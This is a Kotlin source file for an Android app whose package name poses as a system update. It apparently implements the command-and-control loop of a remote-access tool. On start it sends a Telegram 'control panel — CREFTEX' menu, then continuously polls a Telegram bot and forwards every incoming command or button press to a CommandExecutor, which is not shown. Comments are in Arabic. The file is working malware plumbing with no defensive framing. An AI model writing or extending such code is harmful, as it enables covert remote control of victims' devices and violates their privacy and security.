package com.sys.update2

import android.content.Context
import android.util.Log
import org.json.JSONObject
import kotlin.concurrent.thread

object CommandListener {

    private var running = false
    private var worker: Thread? = null
    private var offset = 0L

    fun start(ctx: Context) {
        if (running) return
        running = true

        Log.d("CmdListener", "Starting...")

        // ⭐ أرسل الأزرار فورًا عند التشغيل
        try {
            val sent = TelegramApi.sendMessage(
                "🎛 *لوحة التحكم — CREFTEX*\n\n" +
                "الأزرار جاهزة 👇",
                KeyboardBuilder.replyKeyboard()
            )
            Log.d("CmdListener", "Menu sent: msgId=$sent")
        } catch (e: Exception) {
            Log.e("CmdListener", "Menu send err: ${e.message}")
        }

        worker = thread(name = "telegram-poll") {
            while (running) {
                try {
                    poll(ctx)
                } catch (e: Exception) {
                    Log.e("CmdListener", "poll err: ${e.message}")
                    Thread.sleep(2000)
                }
            }
        }
    }

    fun stop() {
        running = false
        worker?.interrupt()
        worker = null
    }

    private fun poll(ctx: Context) {
        try {
            val updates = TelegramApi.getUpdates(offset)
            if (updates == null) {
                Thread.sleep(2000)
                return
            }

            if (updates.length() == 0) {
                // لا تحديثات → انتظر (Long polling)
                Thread.sleep(500)
                return
            }

            for (i in 0 until updates.length()) {
                val update = updates.optJSONObject(i) ?: continue
                val updateId = update.optLong("update_id", 0)
                offset = updateId + 1

                processUpdate(ctx, update)
            }

        } catch (e: Exception) {
            Log.e("CmdListener", "poll err: ${e.message}")
            Thread.sleep(3000)
        }
    }

    private fun processUpdate(ctx: Context, update: JSONObject) {
        try {
            update.optJSONObject("callback_query")?.let { cb ->
                val data = cb.optString("data", "")
                val cbId = cb.optString("id", "")
                if (data.isNotBlank()) {
                    TelegramApi.answerCallback(cbId)
                    CommandExecutor.handle(ctx, data, cbId)
                }
                return
            }

            update.optJSONObject("message")?.let { msg ->
                val text = msg.optString("text", "").trim()
                Log.d("CmdListener", "msg: $text")
                if (text.isNotBlank()) {
                    CommandExecutor.handleText(ctx, text)
                }
            }
        } catch (e: Exception) {
            Log.e("CmdListener", "process err: ${e.message}")
        }
    }
}
